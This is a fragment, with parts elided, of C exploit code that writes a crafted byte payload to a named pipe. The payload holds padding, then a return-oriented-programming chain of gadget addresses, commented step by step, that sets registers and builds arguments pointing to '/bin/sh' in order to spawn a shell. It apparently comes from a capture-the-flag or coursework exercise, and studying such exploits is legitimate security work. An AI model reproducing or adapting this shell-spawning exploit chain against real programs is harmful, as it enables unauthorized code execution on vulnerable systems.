...
int main(void)
{
  writecmd(PIPEPATH, "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      ...
                      "\xaa\xaa\xaa\xaa" // four-byte value eax
                      "\xaa\xaa\xaa\xaa" // four-byte value 0
                      ""
                      "\xbe\xc6\xb6\xbb" // move 85 into eax
                      "\x8C\x9C\xA9\xBB" // inc eax
                      ...
                      "\xD4\xBE\xB3\xBB" // 0 out edx
                      "\x22\xA4\xBA\xBB\xd8\x2a\xbf\xbf" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
                      "\x7E\xB8\xB6\xBB" // move edx (0 word to y array)
                      "\x22\xA4\xBA\xBB\xe0\x2a\xbf\xbf" // pop esp into ecx (future address of 0 word 0xbfbf28d8) then move edx (0 word) to addy stored at ecx
                      ...
                      "\xe4\x2a\xbf\xbf" // addy of bin/sh (x) 
                      "\xdc\x2a\xbf\xbf" // addy of y
